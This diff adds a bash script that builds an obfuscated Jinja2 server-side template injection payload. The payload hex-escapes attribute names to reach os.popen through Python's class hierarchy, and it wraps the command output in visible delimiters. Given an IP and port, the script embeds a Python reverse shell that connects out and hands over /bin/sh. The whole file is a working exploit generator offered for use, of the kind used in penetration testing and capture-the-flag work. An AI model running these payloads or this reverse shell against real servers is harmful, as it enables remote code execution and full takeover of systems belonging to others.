@@ -1,0 +1,62 @@
+#!/bin/bash
+# This is so simple that I"m gonna make it a shell script
+#
+# This is a tranlation of the cyclic3/murk implementation (whose implementation is, in turn, is a heavy modification of swisskyrepo/PayloadsAllTheThings)
+
+# renders as <br>pwnbegin<br>
+# renders as <br>pwnend<br>
+function escape_one() {
+  printf '\\x%x' "'$1"
+}
+function zealous_escape_c() {
+  # https://stackoverflow.com/a/10458814
+  #
+  # We seem to need to remove trailing null as well
+  for i in $(seq 0 $(( $(expr length "${1}") - 1)))
+  do
+    escape_one "${1:$i:1}"
+  done
+}
+
+export jinja2pwn_begin_delim='{{"\x3c\x62\x72\x3e"|safe}}pwnbegin{{"\x3c\x62\x72\x3e"|safe}}'
+export jinja2pwn_end_delim='{{"\x3c\x62\x72\x3e"|safe}}pwnend{{"\x3c\x62\x72\x3e"|safe}}'
+
+case "$#" in
+1)
+  export payload="$1"
+  ;;
+2)
+  export payload="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\", $2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\"]);'"
+  ;;
+*)
+  echo Usage:
+  echo $0 '<command>'
+  echo $0 '<ip>' '<port>'
+  exit 1
+  ;;
+esac
+
+echo -n '{%set MURKallt=()'
+echo -n    '|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")'
+echo -n    '|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")'
+echo -n    '|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()'
+echo -n '%}'
+echo -n '{%for x in MURKallt %}'
+echo -n   '{%if"\x77\x61\x72\x6e\x69\x6e\x67"in(x|attr("\x5f\x5f\x6e\x61\x6d\x65\x5f\x5f"))%}'
+echo -n     $jinja2pwn_begin_delim
+echo -n   '{{'
+echo -n     'x()'
+echo -n     '|attr("\x5f\x6d\x6f\x64\x75\x6c\x65")'
+echo -n     '|attr("\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f")'
+echo -n     '|attr("\x67\x65\x74")("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f")("os")'
+echo -n     '|attr("\x70\x6f\x70\x65\x6e")("'
+                                            zealous_escape_c "$payload"
+echo -n                                                           '")'
+echo -n     '|attr("\x72\x65\x61\x64")()'
+echo -n     '|replace("\x3c","\x26\x67\x74\x3b")' # Replaces newlines
+echo -n     '|safe'
+echo -n   '}}'
+echo -n    $jinja2pwn_end_delim
+echo -n   '{%endif%}'
+echo -n '{%endfor%}'
+echo
